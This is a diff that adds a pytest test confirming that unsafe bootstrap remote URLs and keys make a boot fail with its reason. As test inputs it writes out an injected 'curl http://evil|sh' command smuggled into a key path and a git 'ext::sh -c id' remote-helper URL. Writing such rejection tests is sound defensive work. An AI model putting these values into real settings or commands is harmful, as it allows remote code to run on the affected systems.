@@ -173,3 +173,17 @@ def test_multi_project_repo_is_refused(tmp_path):
     with pytest.raises(RuntimeError, match="several top-level projects"):
         with _boot(tmp_path / "b", bootstrap_remote=remote):
             pass
+
+
+def test_unsafe_bootstrap_remote_or_key_fails_the_boot(tmp_path):
+    # INCANT_BOOTSTRAP_REMOTE(_KEY) become a registered remote's url/auth_ref and reach
+    # a shell via git exactly like an admin-supplied remote — same grammar, and a bad
+    # value fails the boot WITH ITS REASON rather than being registered.
+    remote = _bare(tmp_path / "backup.git")
+    with pytest.raises(RuntimeError, match="BOOTSTRAP_REMOTE_KEY rejected.*shell"):
+        with _boot(tmp_path, bootstrap_remote=remote,
+                   bootstrap_remote_key="/run/key; curl http://evil|sh #"):
+            pass
+    with pytest.raises(RuntimeError, match="BOOTSTRAP_REMOTE.*remote-helper"):
+        with _boot(tmp_path / "b", bootstrap_remote="ext::sh -c id"):
+            pass
